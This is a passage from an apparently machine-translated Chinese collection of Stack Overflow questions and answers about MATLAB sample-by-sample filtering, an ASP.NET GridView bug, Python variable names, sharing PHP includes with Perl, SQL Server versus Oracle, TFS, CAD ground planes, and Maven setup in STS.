myFilterH(fh2, 'init', Acoeff, Bcoeff);

% Add a value to be filtered.
myFilterH(fh1, 10);
myFilterH(fh2, 10);
[myFilterH(fh1, 'getCurrentY'), myFilterH(fh2, 'getCurrentY')]

ans =
    40.0000    2.5000

% Add another one.
myFilterH(fh1, 20);
myFilterH(fh2, 20);
[myFilterH(fh1, 'getCurrentY'), myFilterH(fh2, 'getCurrentY')]

ans =
    50.0000    6.8750

% And a third one.
myFilterH(fh1, 30);
myFilterH(fh2, 30);
[myFilterH(fh1, 'getCurrentY'), myFilterH(fh2, 'getCurrentY')]

ans =
     0   16.4063

% Compare with the Matlab filter function.
filter(Bcoeff, Acoeff, [10 20 30])

ans =
    40    50     0

filter(Acoeff, Bcoeff, [10 20 30])
ans =
    2.5000    6.8750   16.4063 
```

## 将它用于您的示例

要在您的示例中使用高级方法，您可以首先创建一个过滤器数组：

```
fh = [];
for ind = 1:20
  wn = w(ind,:);
  [b,a] = butter(N,wn);
  fh(ind) = myFilterH('create');
  myFilterH(fh(ind), 'init', b, a);
end 
```

稍后在过滤器部分中，只需将您的值添加到所有过滤器中。但是，为此您还需要反转循环，因为现在您需要每个带每个像素一个过滤器。如果您先循环遍历像素，然后循环遍历波段，则可以重用过滤器：

```
for height = 1:10
  for width = 1:10 
    for bands = 1:20
      myFilterH(fh(bands), 'reset');
      for k = 1:10
        [...]
        ts_f = myFilterH(fh(bands), ...
                         pixel_calculated_meanvalue);                         
        filteredimages{bands}(i,j) = myFilterH(fh(bands), 'getCurrentY');
      end
    end
  end
end 
```

希望有帮助！

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-07-26T20:38:48.503

## 无需重写过滤功能，有*一个*简单的解决方案！

如果您想一次输入[`filter`](http://www.mathworks.com/help/techdoc/ref/filter.html)一个样本，您还需要传递**状态参数**，以便每个输入样本都根据其前身进行处理。过滤后，新的状态实际上是作为第二个参数返回的，这样大部分工作已经由 MATLAB 为您完成。**这是个好消息！**

为了便于阅读，请允许我暂时用简单的字母替换您的变量名：

```
a = aCoeff(bands, :);    
b = bCoeff(bands, :);
x = pixel_calculated_meanvalue; 
```

`ts_f`由 表示`y`。

所以，这个：

```
y = filter(b, a, x); 
```

实际上等价于：

```
N = numel(x);
y = zeros(N, 1);                             %# Preallocate memory for output
z = zeros(max(length(a), length(b)) - 1, 1); %# This is the initial filter state
for i = 1:N
    [y(i), z] = filter(b, a, x(i), z);
end 
```

您可以自己检查结果是否相同！

对于您的示例，代码将是：

```
N = numel(pixel_calculated_meanvalue);
ts_f = zeros(N, 1);
z = zeros(max(length(aCoeff(bands, :)), length(bCoeff(bands, :))) - 1, 1); 
for i = 1:N
    [ts_f(i), z] = filter(bCoeff(bands, :), aCoeff(bands, :), ...
        pixel_calculated_meanvalue(i), z);
end 
```

使用此方法，您可以一次处理一个输入样本，只需确保在每次`filter`调用后存储最后一个过滤器状态。如果您计划使用多个过滤器，则必须为每个过滤器存储一个状态向量！

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-07-20T16:50:13.027

如果我正确理解了这个问题，关键是“如何从 Matlab 函数返回多个东西？”

您可以像这样返回多个内容：

```
function [a,  b, np, x, y] = filter(ord, a,  b, np, x, y)
    %code of function here
    %make some changes to a, b, np, x, and y
end 
```

如果你想`filter`从另一个函数调用并捕获它的返回值，你可以这样做：

```
function [] = main()
    %do some stuff, presumably generate initial values for ord, a,  b, np, x, y
    [new_a,  new_b, new_np, new_x, new_y] = filter(ord, a,  b, np, x, y)  
end 
```

简而言之，如果您这样做`function [x, y] = myfunc(a, b)`，则`myfunc`返回 x 和 y。

# c# - 为什么我的 GridView 会退出编辑模式？

> ID：11583525
> 
> 赞同：1
> 
> 时间：2012-07-20T16:36:52.463
> 
> 标签：c#, asp.net, gridview

***在有人回答这个问题之前***，我在我的代码中发现了这个错误，并在下面发布了我的答案。我把这个问题留了下来（除非有人真的在乎）作为一个警示故事，以始终约束你的 bleeping`GridView`。

* * *

**前言/背景**

我（ab）以一种奇怪的方式使用 ASP.NET WebForms 控件。我知道。

我正在开发一个应用程序，希望学生列出他们参加过的一些学校活动。学生可以添加几行，并且——仅出于一般工作流程的原因——我决定将`GridView`显示他们“已保存”条目的行分开从他们添加/更新活动的“详细信息”区域。

编辑/更新作品精美。我可以添加新项目，使用绑定到我的类中的内置验证（这是所有具有属性的额外`span`标签显示的内容）。`class="error"`我真的很想让这个白痴证明，所以他们单击添加新活动的按钮也将验证并将他们的信息添加到`GridView`（如果项目通过验证），清除详细信息控件，并正常运行。

**问题描述**

我对此开始了一些基本测试，发现如果我编辑一个活动，打破该类中的一个（或多个）验证规则，然后单击“添加新活动”按钮，我`GridView`将该行从`EditItemTemplate`后面恢复到正常`ItemTemplate`。

据我所知，我`EditIndex`从未偏离我仍在编辑的行。事实上，如果我触发另一个回发，则`GridView`显示正确`EditIndex`！

我已经尝试重新设置`EditIndex`并切换我`e.Cancel = true`的`return`声明。什么都没奏效。考虑到`EditIndex's`值通过多次回发保持不变，我不得不认为这里发生了一些奇怪的事情。

我在下面发布了标记和 C# 代码。两者都非常荒谬 - 我重构了我的功能 - 所以我提前道歉，并感谢任何足够勇敢（或足够无聊）提供建议的人。

此外，如果有人愿意看到这种情况发生而不是（或除此之外）阅读我的标记/代码，我可以提供屏幕截图。

**`GridView`**

```
<asp:GridView ID="schoolActivities" AutoGenerateColumns="false" runat="server">
    <Columns>
        <asp:TemplateField>
            <ItemTemplate>
                <asp:Button ID="edit" CommandName="Edit" runat="server" Text="Edit" />
            </ItemTemplate>
            <EditItemTemplate></EditItemTemplate>
        </asp:TemplateField>
        <asp:TemplateField>
            <HeaderTemplate></HeaderTemplate>
            <ItemTemplate>
                <%# DataBinder.GetPropertyValue(Container.DataItem, "Details") %>
            </ItemTemplate>
            <EditItemTemplate>Editing...</EditItemTemplate>
        </asp:TemplateField>
        <asp:TemplateField>
            <HeaderTemplate>
                Months per Year
            </HeaderTemplate>
            <ItemTemplate><%# DataBinder.GetPropertyValue(Container.DataItem, "MonthsPerYear") %></ItemTemplate>
            <EditItemTemplate></EditItemTemplate>
        </asp:TemplateField>
        <asp:TemplateField>
            <HeaderTemplate>Date</HeaderTemplate>
            <ItemTemplate>
                <%# DataBinder.GetPropertyValue(Container.DataItem, "ActivityDate") %>
            </ItemTemplate>
            <EditItemTemplate></EditItemTemplate>
        </asp:TemplateField>
        <asp:TemplateField>
            <HeaderTemplate>
                Total Hours Outside Class Time
            </HeaderTemplate>
            <ItemTemplate>
                <%# DataBinder.GetPropertyValue(Container.DataItem, "TotalHours") %>
            </ItemTemplate>
            <EditItemTemplate></EditItemTemplate>
        </asp:TemplateField>
    </Columns>
</asp:GridView> 
```

**“详细信息”部分**

```
<br />
<button type="button" id="newActivity" runat="server">Add New Activity</button>
<br />

<fieldset id="schoolActivityFields" runat="server" visible="false">
    <legend>Activity</legend>

    <span>Details:</span>
    <span>
        <textarea id="schoolActivityDetails" class="schoolActivityDetails" runat="server"></textarea>
        <br />
        <span id="schoolActivityDetailsError" class="error" runat="server"></span>
    </span>
    <br />

    <span>Months per Year:</span>
    <span>
        <select id="schoolActivityMonthsPerYear" runat="server">
            <option>1</option>
            <option>2</option>
            <option>3</option>
            <option>4</option>
            <option>5</option>
            <option>6</option>
            <option>7</option>
            <option>8</option>
            <option>9</option>
            <option>10</option>
            <option>11</option>
            <option>12</option>
        </select>
    </span>
    <span id="schoolActivityMonthsPerYearError" class="error" runat="server"></span>
    <br />

    <span>Date:</span>
    <span>
        <select id="schoolActivityDate" runat="server">
            <option>2005</option>
            <option>2006</option>
            <option>2007</option>
            <option>2008</option>
            <option>2009</option>
            <option>2010</option>
            <option>2011</option>
            <option>2012</option>
        </select>
    </span>
    <span id="schoolActivityDateError" class="error" runat="server"></span>
    <br />

    <span>Total Hours:</span>
    <span>
        <input type="text" id="schoolActivityTotalHours" runat="server" />
    </span>
    <span id="schoolActivityTotalHoursError" class="error" runat="server"></span>
    <br />

    <button type="button" id="addActivity" runat="server">Add Activity</button>
    <button type="button" id="updateActivity" runat="server" visible="false">Update Activity</button>
    <button type="button" id="cancelEditActivity" runat="server" visible="false">Cancel Editing Activity</button>
    <button type="button" id="deleteActivity" runat="server" visible="false">Delete Activity</button>
</fieldset> 
```

C# 的长度很长，但对于任何勇敢的人来说：

```
void addActivity_ServerClick(object sender, EventArgs e)
{
    AddSchoolActivity();
}

private bool AddSchoolActivity()
{
    ResetSchoolActivityErrors();
    SchoolActivity activityToAdd = GetSchoolActivity();

    try
    {
        SessionApplication.SchoolActivities.Add(activityToAdd);

        BindSchoolActivities();
        ResetSchoolActivityFields();
        HideSchoolActivityFields();
    }
    catch (BrokenRuleException)
    {
        MapSchoolActivityErrors(activityToAdd);
        return false;
    }

    return true;
}

void updateActivity_ServerClick(object sender, EventArgs e)
{
    UpdateSchoolActivity();
}

private bool UpdateSchoolActivity()
{
    ResetSchoolActivityErrors();
    SchoolActivity activityToUpdate = GetSchoolActivity();

    try
    {
        SessionApplication.SchoolActivities[schoolActivities.EditIndex] = activityToUpdate;
        ResetSchoolActivitiesEditIndex();

        BindSchoolActivities();
        ResetSchoolActivityFields();
        HideSchoolActivityFields();
    }
    catch (BrokenRuleException)
    {
        MapSchoolActivityErrors(activityToUpdate);
        SetSchoolActivitiesEditIndex(schoolActivities.EditIndex);
        return false;
    }

    return true;
}

private SchoolActivity GetSchoolActivity()
{
    SchoolActivity currentActivity = new SchoolActivity();

    currentActivity.Details = schoolActivityDetails.Value;

    TryGetSchoolActivityMonthsPerYear(currentActivity);
    TryGetSchoolActivityDate(currentActivity);
    TryGetSchoolActivityTotalHours(currentActivity);

    return currentActivity;
}

private void TryGetSchoolActivityMonthsPerYear(SchoolActivity currentActivity)
{
    byte monthsPerYear;

    if (byte.TryParse(schoolActivityMonthsPerYear.Value, out monthsPerYear))
    {
        currentActivity.MonthsPerYear = monthsPerYear;
    }
}

private void TryGetSchoolActivityDate(SchoolActivity currentActivity)
{
    short activityDate = -1;

    if (short.TryParse(schoolActivityDate.Value, out activityDate))
    {
        currentActivity.ActivityDate = activityDate;
    }
}

private void TryGetSchoolActivityTotalHours(SchoolActivity currentActivity)
{
    short totalHours = -1;

    if (schoolActivityTotalHours.Value.IsNullOrWhiteSpace() == false
        && short.TryParse(schoolActivityTotalHours.Value, out totalHours))
    {
        currentActivity.TotalHours = totalHours;
    }
}

private void ResetSchoolActivityFields()
{
    schoolActivityDetails.Value = string.Empty;
    schoolActivityMonthsPerYear.SelectedIndex = 0;
    schoolActivityDate.SelectedIndex = 0;
    schoolActivityTotalHours.Value = string.Empty;
}

private void HideSchoolActivityFields()
{
    schoolActivityFields.Visible = false;
}

private void MapSchoolActivityErrors(int activityIndex)
{
    SchoolActivity updatedActivity = SessionApplication.SchoolActivities[activityIndex];

    MapSchoolActivityErrors(updatedActivity);
}

private void MapSchoolActivityErrors(SchoolActivity updatedActivity)
{
    foreach (RuleViolation currentViolation in updatedActivity.GetRuleViolations())
    {
        schoolActivityErrorMapping[currentViolation].InnerText = currentViolation.ErrorMessage;
    }
}

private void ResetSchoolActivityErrors()
{
    foreach (RuleViolation currentViolation in schoolActivityErrorMapping.Keys)
    {
        schoolActivityErrorMapping[currentViolation].InnerText = string.Empty;
    }
}

void schoolActivities_RowEditing(object sender, GridViewEditEventArgs e)
{
    if (schoolActivities.EditIndex != e.NewEditIndex
        && schoolActivities.EditIndex != -1)
    {
        ResetSchoolActivityErrors();
        SchoolActivity activityToUpdate = GetSchoolActivity();

        try
        {
            SessionApplication.SchoolActivities[schoolActivities.EditIndex] = activityToUpdate;
        }
        catch (BrokenRuleException)
        {
            MapSchoolActivityErrors(activityToUpdate);
            e.Cancel = true;
        }
    }

    if (e.NewEditIndex != -1)
    {
        SchoolActivity activityToEdit = SessionApplication.SchoolActivities[e.NewEditIndex];

        SetSchoolActivityFields(activityToEdit);
        ShowSchoolActivityFields();
        ShowModifyActivityButtons();
    }

    SetSchoolActivitiesEditIndex(e.NewEditIndex);
    BindSchoolActivities();
}

private void ShowModifyActivityButtons()
{
    addActivity.Visible = false;
    updateActivity.Visible = true;
    cancelEditActivity.Visible = true;
    deleteActivity.Visible = true;
}

private void SetSchoolActivityFields(SchoolActivity activityToEdit)
{
    schoolActivityDetails.Value = activityToEdit.Details;
    schoolActivityMonthsPerYear.Value = activityToEdit.MonthsPerYear.ToString();
    schoolActivityDate.Value = activityToEdit.ActivityDate.ToString();
    schoolActivityTotalHours.Value = activityToEdit.TotalHours.ToString();
}

private bool ShowSchoolActivityFields()
{
    return schoolActivityFields.Visible = true;
}

private void BindSchoolActivities()
{
    schoolActivities.DataSource = SessionApplication.SchoolActivities;
    schoolActivities.DataBind();
}

void newActivity_ServerClick(object sender, EventArgs e)
{
    if (SessionApplication.SchoolActivities.Count < SchoolActivityList.Rules.MaxCount)
    {
        if (schoolActivities.EditIndex != -1)
        {
            if (UpdateSchoolActivity() == false)
            {
                return;
            }
        }
        else if (schoolActivityFields.Visible)
        {
            if (AddSchoolActivity() == false)
            {
                return;
            }
        }

        ShowSchoolActivityFields();
        ShowAddActivityButtons();
    }
}

private void ShowAddActivityButtons()
{
    addActivity.Visible = true;
    updateActivity.Visible = false;
    cancelEditActivity.Visible = false;
    deleteActivity.Visible = false;
}

void ResetSchoolActivitiesEditIndex()
{
    SetSchoolActivitiesEditIndex(-1);
}

void SetSchoolActivitiesEditIndex(int rowIndex)
{
    schoolActivities.EditIndex = rowIndex;
} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-20T16:57:37.360

叹。我错过了对绑定函数的调用。

`UpdateSchoolActivity()`应该是这样的：

```
private bool UpdateSchoolActivity()
{
    ResetSchoolActivityErrors();
    SchoolActivity activityToUpdate = GetSchoolActivity();

    try
    {
        SessionApplication.SchoolActivities[schoolActivities.EditIndex] = activityToUpdate;
        ResetSchoolActivitiesEditIndex();

        BindSchoolActivities();
        ResetSchoolActivityFields();
        HideSchoolActivityFields();
    }
    catch (BrokenRuleException)
    {
        MapSchoolActivityErrors(activityToUpdate);
        SetSchoolActivitiesEditIndex(schoolActivities.EditIndex);
        BindSchoolActivities(); // That little guy? Don't worry about that little guy.
        return false;
    }

    return true;
} 
```

# python - python获取函数中参数的变量名

> ID：11583526
> 
> 赞同：6
> 
> 时间：2012-07-20T16:37:00.080
> 
> 标签：python

我想做这样的事情：

```
fib = 1
foo = (arg):
    print arg, argName # the name of the variable that was put in for arg
foo(fib) 
```

并得到这个返回：

```
1, fib 
```

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-07-20T16:41:06.323

你不能那样做（正如 Ignacio Vazquez-Abrams 已经回答的那样），但你可以用类似的方式来做：

```
>>> def foo(**kwargs):
    for arg_name in kwargs:
        return kwargs[arg_name], arg_name

>>> foo(fib=1)
(1, 'fib') 
```

唯一的区别是你必须使用关键字参数，否则它将不起作用。

另一种解决方案是访问`__name__`传递变量的属性，这将导致获取函数、类或名称（或任何其他将定义此名称的名称）的名称。您唯一应该注意的是，默认情况下这不是变量的名称，而是函数/类/模块的原始名称（定义时分配的名称）。请参阅此处的示例：http: [//ideone.com/MzHNND](http://ideone.com/MzHNND)

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-07-20T16:38:04.847

做不到。Python 不区分该级别的名称。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2020-07-09T19:56:44.203

您现在可以使用 package.json 中的值包装器来完成此操作`python-varname`。

```
from varname import Wrapper

fib = Wrapper(1)

def foo(arg):
  print(arg.value, arg.name)

foo(fib)
# 1, "fib" 
```

该软件包托管在[https://github.com/pwwang/python-varname](https://github.com/pwwang/python-varname)

我是包的作者。如果您对使用它有任何疑问，请告诉我。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-07-20T16:40:58.117

```
def print_args(**kwargs):
    for name,value in kwargs.iteritems():
        print name, value 
```

# php - 将 php.inc 文件导入 PERL 程序

> ID：11583527
> 
> 赞同：1
> 
> 时间：2012-07-20T16:37:04.287
> 
> 标签：php, linux, perl

我正在尝试为 perl 和 php 使用 1 个包含文件

有没有在 perl 中导入 myphp.inc 文件的好方法？

```
$ cat myphp.inc
<?php
    $some_var="hello world";
?> 
```

在我的 test.php 中使用上述内容可以正常工作：

```
include "myphp.inc"; 
```

如果我删除 < ? php 然后 test.php 只会打印出 myphp.inc 文件的内容......如果我把它们留在里面，那么我的 perl 程序会抱怨：

```
Unterminated <> operator 
```

我见过 perl 模块：PHP::Include 但如果可能的话，我想远离外部模块。

有人对此有想法吗？

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2012-07-20T16:43:32.100

不要尝试编写既是 PHP 又是 Perl 的代码，它们是不同的语言，即使它们有一些共同的祖先。如果要在两者之间共享数据，请使用结构化数据格式。[JSON](http://json.org/)是一种流行的风格。PHP 有[parse_json](http://php.net/parse_json)，Perl 有[JSON](https://metacpan.org/module/JSON)模块。

> 如果可能的话，我想远离外部模块

代码重用是一种美德……尽管没有什么能阻止您从头开始重新实现模块。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-07-21T00:30:39.740

理想情况下，您应该以 PHP 和 Perl 都易于阅读的格式存储共享/配置数据。XML、JSON 或带有键值对的简单文本文件（如 simbabque 建议的 .ini 文件）会很好用。

如果您决定在 Perl 中读取 PHP 文件，但又不想使用 PHP::Include 之类的模块，那么您只需要编写如下内容：

```
use IO::File;

sub require_php {
        my $source_filename = $_[0];
        my $dest_filename = 'temp.inc.pl';
        open my $source, $source_filename or die "Could not open $source_filename: $!";
        open my $destination, '>>'.$dest_filename or die "Cound not open file for writing";
        while(my $line = <$source>) {
                if(index($line,'<?php')==-1 && index($line,'?>')==-1) {
                        print $destination $line
                }
        }
        close $destination;
        close $source;
        require $dest_filename;
        unlink $dest_filename;
}

our $some_var = '';
require_php('myphp.inc'); 
```

这将以`$some_var`具有“hello world”的值结束。

# asp.net - 我是否应该考虑为我的 ASP.NET 应用程序从 SQL Server 迁移到 Oracle？

> ID：11583529
> 
> 赞同：0
> 
> 时间：2012-07-20T16:37:09.200
> 
> 标签：asp.net, sql-server, oracle

我们正在升级我们的系统以支持集群和自动故障转移功能。我们的业务在 SQL Server Express 上运行 .NET 4 应用程序、Web 应用程序和服务。我们可以升级到 SQL Server Standard，但成本促使我们考虑其他选择。将我们的 .NET 数据层与 ODP.NET 集成是合法的选择吗？搜索后，我看到一两个有倾向性的否定陈述（[即](https://stackoverflow.com/questions/7902160/best-way-to-migrate-a-windows-forms-application-from-sql-server-to-oracle)），但似乎[人们无论如何都在这样做](http://codechief.wordpress.com/2010/08/11/oracle-net-development-requirements/)。我们将失去 Visual Studio IDE 中的哪些开发功能？谢谢你的帮助！

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-07-20T18:53:18.387

好吧，我现在已经在 Oracle 和 MS SQL Server 工作了 20 多年，做过很多项目。一些项目现在已经运行了 10 多年，包括所有的更新、维护等。

我的快速回答是：继续使用 MS SQL Server。如果您有非常好的技术理由，或者如果您正在计划一个非常庞大的数据库，并且如果您有足够的人员来处理所有管理，请只使用 Oracle。

主要原因是 SQL Server 更容易维护；并且它还极大地集成到了微软环境中。

相比之下，甲骨文的学习曲线陡峭。Oracle 的处理比 MS SQL Server 更“手动”。嗯，这也是一件好事，因为每个小细节你都在掌控之中，但这也意味着你需要学习很多；或者你需要付钱给专家。而且要找到真正知道该做什么的人也不是那么容易。

我真的很喜欢这两个系统，但根据经验，我通常建议使用 MS SQL Server。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-20T18:34:44.547

多年来，我一直将 .net 与 Oracle 一起使用，并且只要有可用的选项，我就不再使用它。

如果您所有的数据库代码都在存储过程中，并且您通过代码隐藏或库调用它并且您使用 ansi sql，那么从 ms sql 到 oracle 的迁移将相当轻松。

如果您使用 TableAdapters，他们会将您输入的任何 sql 重写为 oldschool oracle 8 语法，例如 table1、table2、table3，然后有一个很大的 where 子句来执行连接条件。还有一些奇怪的错误，有时在 SQL Developer 中运行良好的 sql 无法在 TableAdapter 中工作。

如果您使用实体框架迁移应该很容易，但是 MS SQL 驱动程序比 Oracle 驱动程序要好得多。由于当前驱动程序的一些各种错误，我无法通过 oracle 中的 EF 进行一些查询。

如果您需要更多信息，请告诉我。

此外，如果成本是考虑迁移的主要原因，为什么不使用 mysql 呢？

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-07-21T00:33:33.930

由于您已经在使用 MS SQL，因此您必须习惯于它的工作方式，无论是实体框架还是任何其他数据执行。是的，在场外，微软为其提供了非常高的许可费率。但是，如果您想移动到任何其他数据库，那是完全可以的。我个人使用过 MS SQL 和 MySQL。最初您可能会遇到一些与语法相关的问题，但请记住，获取和保存数据的逻辑保持不变。此外，它还提供了一个好处，即您必须学习一门新语言，而且花费更少的钱。

# version-control - 如何完全回滚 Team Foundation Server 工作区？

> ID：11583539
> 
> 赞同：0
> 
> 时间：2012-07-20T16:37:25.783
> 
> 标签：version-control, tfs

在 Team Foundation 中创建搁置集时，我有时会忘记取消选中“保留本地更改”框。结果，我有一个工作副本，其中包含评论、更改的文件、关联的工作项等，我想恢复到“原始”状态，就好像我刚刚检查过它一样。

到目前为止，我一直这样做的方式是创建一个单独的架子集，我取消选中该框，然后立即删除架子集。但这似乎是颈部的主要疼痛。

有没有我错过的“撤消一切”按钮？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-20T16:44:16.357

你有两个选择：

1.  在源代码管理资源管理器中，导航到包含所有子项的任何父项（例如，您可以在 $/ 上执行此操作）并右键单击并从上下文菜单中选择“撤消挂起的更改...”。

2.  在 Pending Changes 视图中，选择所有更改并右键单击并选择“Undo”。

这两者在功能上都应该等同于在搁置时撤消待处理的更改。

# graphics - 如何在 3D CAD 应用程序中构建无限大的地表？

> ID：11583544
> 
> 赞同：1
> 
> 时间：2012-07-20T16:37:51.627
> 
> 标签：graphics, 3d, geometry, cad

我正在尝试在 UI 中创建一个类似于 Sketchup 的应用程序。作为第一步，我需要显示向各个方向延伸的地表。做这个的最好方式是什么？

选项：

1.  创建一个足够大的正多边形，从原点向各个方向延伸。在这里，用户可能会撞到边缘并从地球表面掉下来。
2.  将地球表面建模为球体/椭球体。在这里，我将把我的顶点坐标限制为非常大的值，容易出现四舍五入错误。（地球半径为 6371000000 毫米）。
3.  与 1 相同，但随着用户靠近它们会动态扩展地球的两端。

**通常的做法是**什么？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-20T16:44:23.687

我想你不会做这些，而是​​使用虚拟地面。

因此，您只需找出在视口中可见的地面部分，然后创建一个足够大的平面来填充它。有一些合理的最大值，它模拟了我们所知道的视线的尽头，也就是我们所知道的地平线。

# machine-learning - JMegahal 的替代品

> ID：11583546
> 
> 赞同：1
> 
> 时间：2012-07-20T16:38:06.283
> 
> 标签：machine-learning, java

我正在寻找[JMegahal](http://www.jibble.org/jmegahal/)的替代品，它同样简单易用，但效果更好。我知道 JMegahal 使用马尔可夫链来生成新的字符串，而且我知道它们不一定是最好的。我被指出贝叶斯网络是解决这个问题的最佳概念解决方案，但我找不到任何易于使用的 Java 库。我看到了 WEKA，但它看起来很臃肿，很难跟上。我还看到了 JavaBayes，但它几乎完全没有文档记录（他们的 javadocs 包含的信息很少甚至没有，而且变量的命名也很糟糕），并且该库公然用 C 风格编写，使其在 Java 中脱颖而出。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-20T17:22:13.293

您可能需要考虑扩展 JMegahal 来过滤输入句子。早在 90 年代中期，Jason Hutchens 就编写了这个 4 阶马尔可夫字符串算法的 C 版本（实际上它可能被用作 JMegahal 实现的灵感）。当时，Jason 添加了过滤器来改进实现（通过用“我”替换“你”等......）。通过进行一些基本的弦乐操作，将主题从扬声器更改为系统，输出变得更加连贯。我认为扩展程序称为 HeX。

[参考1](http://megahal.alioth.debian.org/How.html)

[参考文献 2](http://www.rci.rutgers.edu/~cfs/472_html/Intro/NYT_Intro/History/MachineIntelligence1.html)

# java - 为什么 STS / m2eclipse 不跟踪我的 Maven 依赖项？

> ID：11583551
> 
> 赞同：1
> 
> 时间：2012-07-20T16:38:25.293
> 
> 标签：java, eclipse, maven, m2eclipse, sts-springsourcetoolsuite

我将 SpringSource 工具套件 (STS) 与 Maven + m2eclipse 一起使用。在我的最新项目中，将现有 Maven 项目从 SVN 正确导入 STS 时遇到问题。当我使用`import -> Maven -> 'existing Maven project'`时，项目将导入，但会出现以下问题：

*   和`src/main/java`不`src/test/java`作为源文件夹拾取。STS 将配置`src`为源文件夹，并将 main/test 添加到包名称中。
*   Maven 依赖库未添加到 java 构建路径。

我可以手动更正源文件夹，但是当我尝试将“Maven 托管依赖项”库添加到构建路径时，我收到消息“使用 Maven 项目设置来配置 Maven 依赖项解析”并且未添加该库。我似乎能够设置的唯一 Maven 项目设置是活动配置文件和“解决工作区项目中的依赖项”（选中），这两者似乎都没有任何区别。

![添加 Maven 托管依赖项](../Images/746ab163e63e781f016002a6096e0c1a.png) ![Maven 项目设置](../Images/125a0c749647eeea5a1b156c4985d798.png)

如果我从命令行运行`mvn install`，项目将成功构建。如果我运行`mvn eclipse:eclipse`然后导入 STS，那么一切都按预期工作，但是当然每次更新 pom 时都必须重新运行它，这是不可取的。

我通过运行`mvn eclipse:eclipse`然后手动更新 .classpath 以消除`M2_REPO`添加`eclipse:eclipse`的依赖项并添加 m2eclipse 依赖项条目来解决它：

```
<classpathentry kind="con" path="org.eclipse.m2e.MAVEN2_CLASSPATH_CONTAINER">
  <attributes>
    <attribute name="org.eclipse.jst.component.dependency" value="/WEB-INF/lib"/>
  </attributes>
</classpathentry> 
```

然后我导入了现有的 Maven 项目，它按预期工作。但是，这是一个 hack，我不确定`eclipse:ecplise`在使用 m2eclipse 时运行会产生什么其他后果。

我曾参与过其他 Maven 项目，并且在正确导入它们时没有遇到任何问题。

可能的相关资料：

*   这是一个网络应用项目。
*   subversion repo 仅包含`pom.xml`和`src`文件夹。
*   我使用外部 Maven 安装，它是 3.0.3 版
*   我们使用现场 Artifactory repo 进行工件下载

我尝试过的事情：

*   从 SVN 下载到本地磁盘，然后使用导入现有的 Maven 项目导入到 STS
*   将项目从SVN导入STS，配置->启用Maven性质
*   运行`mvn eclipse:eclipse`然后导入（有效，但需要手动编辑 m2e 的类路径）
*   搜索stackoverflow，发现[这个问题](https://stackoverflow.com/questions/4859825/how-to-add-maven-managed-dependencies-library-in-build-path-eclipse)非常相似，但答案似乎没有解决我的问题。

pom.xml：

```
<project xmlns="http://maven.apache.org/POM/4.0.0" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd">
    <modelVersion>4.0.0</modelVersion>
    <groupId>com.company.group</groupId>
    <artifactId>artifact</artifactId>
    <version>1.0.1-SNAPSHOT</version>
    <packaging>war</packaging>
    <name>My Project</name>
    <description>My Project</description>

    <properties>
        <java-version>1.6</java-version>
        <org.springframework-version>3.1.0.RELEASE</org.springframework-version>
        <!-- Lots of other versions omitted -->
    </properties>

    <repositories>
        <repository>
            <id>repoId</id>
            <name>repoName</name>
            <url>http://fake.company.com/artifactory/repo</url>
            <layout>default</layout>
        </repository>
    </repositories>

    <pluginRepositories>
        <pluginRepository>
            <id>repoId</id>
            <name>repoName</name>
            <url>http://fake.company.com/artifactory/repo</url>
        </pluginRepository>
    </pluginRepositories>

    <!-- Configurations required for deploy plugin. Artifacts are deployed to 
        artifactory -->
    <distributionManagement>
        <repository>
            <id>repoId</id>
            <name>repoName-releases</name>
            <url>http://fake.company.com/artifactory/apps-releases-local</url>
        </repository>
        <snapshotRepository>
            <id>repoId</id>
            <name>repoName-snapshots</name>
            <url>http://fake.company.com/artifactory/apps-snapshots-local</url>
        </snapshotRepository>
    </distributionManagement>

    <scm>
        <connection>scm:svn:https://fake.company.com/svn/fake-repo/trunk</connection>
        <developerConnection>scm:svn:https://fake.company.com/svn/fake-repo/trunk</developerConnection>
        <url>https://fake.company.com/svn/fake-repo/trunk</url>
    </scm>

    <dependencies>
        <dependency>
            <groupId>org.springframework</groupId>
            <artifactId>spring-web</artifactId>
            <version>${org.springframework-version}</version>
        </dependency>
        <!-- Lots of other dependencies omitted -->
    </dependencies>
    <build>
        <plugins>
            <plugin>
                <groupId>org.apache.maven.plugins</groupId>
                <artifactId>maven-surefire-plugin</artifactId>
                <configuration>
                    <excludes>
                        <exclude>**/TestUtil.java</exclude>
                    </excludes>
                </configuration>
            </plugin>
            <plugin>
                <groupId>org.apache.maven.plugins</groupId>
                <artifactId>maven-compiler-plugin</artifactId>
                <version>2.3.2</version>
                <configuration>
                    <verbose>true</verbose>
                    <source>${java-version}</source>
                    <target>${java-version}</target>
                    <compilerVersion>${java-version}</compilerVersion>
                </configuration>
            </plugin>
            <plugin>
                <groupId>org.apache.maven.plugins</groupId>
                <artifactId>maven-war-plugin</artifactId>
                <configuration>
                    <warName>war-name</warName>
                </configuration>
            </plugin>
            <plugin>
                <groupId>org.apache.maven.plugins</groupId>
                <artifactId>maven-dependency-plugin</artifactId>
                <executions>
                    <execution>
                        <id>install</id>
                        <phase>install</phase>
                        <goals>
                            <goal>sources</goal>
                        </goals>
                    </execution>
                </executions>
            </plugin>
            <plugin>
                <groupId>org.codehaus.mojo</groupId>
                <artifactId>cobertura-maven-plugin</artifactId>
                <version>2.5.1</version>
                <configuration>
                    <formats>
                        <format>html</format>
                    </formats>
                    <instrumentation>
                        <ignores>
                            <ignore>path/**/*Test.class</ignore>
                        </ignores>
                        <excludes>
                            <exclude>path/Constants.class</exclude>
                            <exclude>path/*.class</exclude>
                        </excludes>
                    </instrumentation>
                    <check>
